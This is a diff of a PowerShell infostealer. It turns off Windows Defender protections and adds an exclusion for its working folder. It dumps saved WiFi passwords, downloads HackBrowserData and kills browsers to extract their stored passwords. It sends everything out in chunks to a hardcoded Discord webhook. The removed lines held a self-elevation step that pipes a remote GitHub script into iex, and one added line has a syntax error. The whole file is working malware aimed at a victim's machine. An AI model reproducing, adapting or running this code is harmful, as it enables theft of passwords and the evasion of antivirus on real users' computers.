@@ -1,17 +1,19 @@
-# Self-elevation to admin
-if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
-    Start-Process powershell.exe -Verb RunAs -ArgumentList "-EP Bypass -Command irm https://raw.githubusercontent.com/nigmaBoy/pico/refs/heads/main/browserr|iex"
-    exit
-}
-
-# Temporarily disable Windows Defender real-time monitoring
-Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
-
 # Discord Webhook
 $webhook = "https://discord.com/api/webhooks/1467247480428171385/TSirVX8AGKGeYAOImDkrGzyQGQjgGRMq6_E-zkv8UTIzu5jBzFGIC4ug15xtQSTys27R"
 
 # Get PC info
 $pc = "$env:COMPUTERNAME | $env:USERNAME"
+
+# === Disable Windows Defender temporarily ===
+try {
+    Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
+    Set-MpPreference -DisableBehaviorMonitoring $true -ErrorAction SilentlyContinue
+    Set-MpPreference -DisableBlockAtFirstSeen $true -ErrorAction SilentlyContinue
+    Set-MpPreference -DisableIOAVProtection $true -ErrorAction SilentlyContinue
+    Set-MpPreference -DisableScriptScanning $true -ErrorAction SilentlyContinue
+} catch {
+    # Continue if already disabled or no permissions
+}
 
 # === WiFi Passwords ===
 $wifiProfiles = (netsh wlan show profiles) | Select-String "\:(.+)$" | ForEach-Object { $_.Matches.Groups[1].Value.Trim() }
@@ -31,7 +33,10 @@ $tempDir = "$env:TEMP\hbd_$(Get-Random)"
 New-Item -ItemType Directory -Path $tempDir -Force | Out-Null
 
 try {
-    # Download HackBrowserData
+    # Add temp directory to Windows Defender exclusion
+    Add-MpPreference -ExclusionPath $tempDir -ErrorAction SilentlyContinue
+    
+    # Download latest HackBrowserData version with Windows 11 support
     $hbdUrl = "https://github.com/moonD4rk/HackBrowserData/releases/download/v0.4.6/hack-browser-data-windows-64bit.zip"
     $zipPath = "$tempDir\hbd.zip"
     
@@ -42,11 +47,23 @@ try {
     Add-Type -AssemblyName System.IO.Compression.FileSystem
     [System.IO.Compression.ZipFile]::ExtractToDirectory($zipPath, $tempDir)
     
-    # Run HackBrowserData
+    # Force close browsers before extraction
+    taskkill /f /im chrome.exe /im firefox.exe /im msedge.exe /im opera.exe /im brave.exe 2>$null
+    Start-Sleep -Seconds 2
+    
+    # Run HackBrowserData with elevated privileges
     $exePath = "$tempDir\hack-browser-data.exe"
     if(Test-Path $exePath) {
-        & $exePath -b all -f json --dir $tempDir | Out-Null
-        Start-Sleep -Seconds 3
+        # Try to run with admin privileges and verbose output
+        Start-Process -FilePath $exePath -ArgumentList "-b all -f json --dir $tempDir -vv" -WindowStyle Normal -Wait
+        Start-Sleep -Seconds 10
+        
+        # Debug: List all files in temp directory
+        $allFiles = Get-ChildItem -Path $tempDir -Recurse
+        $debugInfo = "Files found: " + ($allFiles.Count) + "`n"
+        foreach($file in $allFiles) {
+            $debugInfo += $file.Name + "`n"
+        }
         
         # Read the password file
         $jsonFile = Get-ChildItem -Path $tempDir -Filter "*password*.json" -Recurse | Select-Object -First 1
@@ -64,7 +81,7 @@ try {
             }
             if(-not $browsers) { $browsers = "No saved browser passwords found" }
         } else {
-            $browsers = "No password data extracted"
+            $browsers = "No password data extracted. Debug info: $debugInfo"
         }
     } else {
         $browsers = "Failed to extract HackBrowserData"
@@ -73,11 +90,20 @@ try {
     $browsers = "Error: $($_.Exception.Message)"
 }
 
-# Clean up
-Remove-Item -Path $tempDir -Recurse -Force -ErrorAction SilentlyContinue
+# === Re-enable Windows Defender ===
+try {
+    Set-MpPreference -DisableRealtimeMonitoring $false -ErrorAction SilentlyContinue
+    Set-MpPreference -DisableBehaviorMonitoring $false -ErrorAction SilentlyContinue
+    Set-MpPreference -DisableBlockAtFirstSeen $false -ErrorAction SilentlyContinue
+    Set-MpPreference -DisableIOAVProtection $false -ErrorAction SilentlyContinue
+    Set-MpPreference -DisableScriptScanning $false -ErrorAction SilentlyContinue
+} catch {
+    # Continue if can't re-enable
+}
 
-# Re-enable Windows Defender real-time monitoring
-Set-MpPreference -DisableRealtimeMonitoring $false -ErrorAction SilentlyContinue
+# Clean up
+Remove-MpPreference -ExclusionPath $tempDir -ErrorAction SilentlyContinue
+Remove-Item -Path $tempDir -Recurse -Force -ErrorAction SilentlyContinue
 
 # === Format and Send ===
 $output = @"
@@ -94,7 +120,7 @@ $browsers
 $maxLen = 1900
 if($output.Length -gt $maxLen) {
     for($i = 0; $i -lt $output.Length; $i += $maxLen) {
-        $chunk = $output.Substring($i, [Math]::Min($maxLen, $output.Length - $i))
+        $chunk = $output.Substring($i, [Math::Min($maxLen, $output.Length - $i))
         $body = @{ content = $chunk } | ConvertTo-Json
         Invoke-RestMethod -Uri $webhook -Method Post -Body $body -ContentType 'application/json'
         Start-Sleep -Milliseconds 500
